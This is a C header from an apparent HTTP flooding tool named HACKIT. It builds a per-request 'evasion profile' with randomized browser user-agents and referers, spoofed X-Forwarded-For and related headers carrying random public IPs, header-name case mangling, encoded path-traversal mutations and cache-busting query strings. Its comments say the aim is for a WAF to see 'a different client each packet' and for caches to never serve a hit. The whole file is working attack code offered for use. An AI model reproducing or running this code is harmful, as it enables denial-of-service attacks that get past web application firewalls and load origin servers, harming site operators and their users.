/* waf.h — per-request evasion profile for the C engines.
 *
 * Everything here is regenerated per request, at C speed: header-name case,
 * forwarding-header IPs, path mutation, cache buster, UA/Accept/Referer draw.
 * A WAF that keys on any single one of those sees a different client each
 * packet.
 *
 * Single-header, static, no state beyond the caller's rng. Include after
 * <stdint.h>/<string.h>/<stdio.h>.
 */
#ifndef HACKIT_WAF_H
#define HACKIT_WAF_H

static const char *const WAF_UA[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
};
static const char *const WAF_ACCEPT[] = {
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "application/json, text/plain, */*",
    "*/*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
};
static const char *const WAF_LANG[] = {
    "en-US,en;q=0.9", "id-ID,id;q=0.9,en;q=0.8", "en-GB,en;q=0.9,id;q=0.7",
    "en-US,en;q=0.5",
};
static const char *const WAF_REF[] = {
    "https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/",
    "https://t.co/", "https://www.facebook.com/", "https://news.ycombinator.com/",
    "https://www.reddit.com/", "https://l.facebook.com/",
};
static const char *const WAF_FWD[] = {
    "X-Forwarded-For", "X-Real-IP", "X-Client-IP", "CF-Connecting-IP",
    "True-Client-IP", "X-Originating-IP", "X-Cluster-Client-IP", "X-ProxyUser-IP",
};
static const char WAF_ALNUM[] =
    "abcdefghijklmnopqrstuvwxyz0123456789";

typedef struct {
    int      enabled;
    uint64_t rng;
} waf_t;

static inline void waf_init(waf_t *w, int enabled, uint64_t seed) {
    w->enabled = enabled;
    w->rng = seed ? seed : 0x9E3779B97F4A7C15ull;
}

static inline uint64_t waf_rand(waf_t *w) {
    uint64_t x = w->rng;
    x ^= x >> 12;
    x ^= x << 25;
    x ^= x >> 27;
    w->rng = x;
    return x * 0x2545F4914F6CDD1Dull;
}

#define WAF_PICK(a) ((a)[waf_rand(w) % (sizeof(a) / sizeof((a)[0]))])

/* Random routable-ish IPv4, dotted quad. */
static inline void waf_rand_ip(waf_t *w, char *out, size_t cap) {
    static const unsigned char first[] = {
        1, 5, 23, 31, 37, 45, 62, 77, 82, 91, 103, 113, 124, 151, 176, 185, 193, 202, 212, 223
    };
    unsigned a = first[waf_rand(w) % sizeof(first)];
    unsigned b = (unsigned)(waf_rand(w) & 0xff);
    unsigned c = (unsigned)(waf_rand(w) & 0xff);
    unsigned d = 1u + (unsigned)(waf_rand(w) % 254u);
    snprintf(out, cap, "%u.%u.%u.%u", a, b, c, d);
}

static inline size_t waf_rand_str(waf_t *w, char *out, size_t len) {
    for (size_t i = 0; i < len; i++) out[i] = WAF_ALNUM[waf_rand(w) % (sizeof(WAF_ALNUM) - 1)];
    out[len] = '\0';
    return len;
}

/* Randomise header-name case. WAF rules are frequently case-sensitive. */
static inline void waf_mangle_case(waf_t *w, char *name) {
    for (char *p = name; *p; p++) {
        if (*p >= 'A' && *p <= 'Z' && (waf_rand(w) & 1)) *p = (char)(*p + 32);
        else if (*p >= 'a' && *p <= 'z' && (waf_rand(w) & 1)) *p = (char)(*p - 32);
    }
}

/* Mutate a path: random segments, traversal, matrix param, encoded space.
   Always leaves a distinct URL so caches never serve a hit. */
static inline size_t waf_build_path(waf_t *w, const char *base, char *out, size_t cap) {
    char seg[3][16];
    int nseg = 1 + (int)(waf_rand(w) % 3);
    for (int i = 0; i < nseg; i++) waf_rand_str(w, seg[i], 3 + (size_t)(waf_rand(w) % 7));

    size_t n = 0;
    int r = snprintf(out, cap, "/%s", seg[0]);
    if (r < 0) return 0;
    n = (size_t)r;
    for (int i = 1; i < nseg && n + 20 < cap; i++) {
        r = snprintf(out + n, cap - n, "/%s", seg[i]);
        if (r < 0) break;
        n += (size_t)r;
    }
    if (n + 24 < cap) {
        switch (waf_rand(w) % 4) {
            case 0: n += (size_t)snprintf(out + n, cap - n, ".html"); break;
            case 1: n += (size_t)snprintf(out + n, cap - n, "/%%2e%%2e/%s", seg[0]); break;
            case 2: {
                char j[20];
                waf_rand_str(w, j, 12);
                n += (size_t)snprintf(out + n, cap - n, ";jsessionid=%s", j);
                break;
            }
            default: {
                char s[8];
                waf_rand_str(w, s, 4);
                n += (size_t)snprintf(out + n, cap - n, "/%s%%20%s", s, s);
                break;
            }
        }
    }
    if (n + 40 < cap) {
        n += (size_t)snprintf(out + n, cap - n, "?_=%lx%lx", (unsigned long)waf_rand(w),
                              (unsigned long)waf_rand(w));
    }
    (void)base;
    return n;
}

/* Full header block, including the mandatory Host and the terminal CRLF. */
static inline size_t waf_build_headers(waf_t *w, const char *host, int keepalive,
                                       char *out, size_t cap) {
    char ip[24], cip[24], rip[24];
    waf_rand_ip(w, ip, sizeof(ip));
    waf_rand_ip(w, cip, sizeof(cip));
    waf_rand_ip(w, rip, sizeof(rip));

    char h1[32], h2[32], h3[32];
    snprintf(h1, sizeof(h1), "%s", WAF_PICK(WAF_FWD));
    snprintf(h2, sizeof(h2), "%s", WAF_PICK(WAF_FWD));
    snprintf(h3, sizeof(h3), "%s", WAF_PICK(WAF_FWD));
    waf_mangle_case(w, h1);
    waf_mangle_case(w, h2);
    waf_mangle_case(w, h3);

    size_t n = 0;
    int r = snprintf(out, cap,
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Accept: %s\r\n"
        "Accept-Language: %s\r\n"
        "Accept-Encoding: gzip, deflate, br\r\n"
        "Referer: %s\r\n"
        "Cache-Control: %s\r\n"
        "Pragma: no-cache\r\n"
        "Upgrade-Insecure-Requests: 1\r\n"
        "DNT: 1\r\n"
        "Connection: %s\r\n"
        "%s: %s\r\n"
        "%s: %s\r\n"
        "%s: %s\r\n"
        "Forwarded: for=%s;proto=%s\r\n"
        "\r\n",
        host, WAF_PICK(WAF_UA), WAF_PICK(WAF_ACCEPT), WAF_PICK(WAF_LANG),
        WAF_PICK(WAF_REF),
        (waf_rand(w) & 1) ? "no-cache" : "max-age=0",
        keepalive ? "keep-alive" : "close",
        h1, ip, h2, cip, h3, rip,
        rip, (waf_rand(w) & 1) ? "https" : "http");
    if (r < 0) return 0;
    n = (size_t)r;
    return n < cap ? n : cap - 1;
}

#endif /* HACKIT_WAF_H */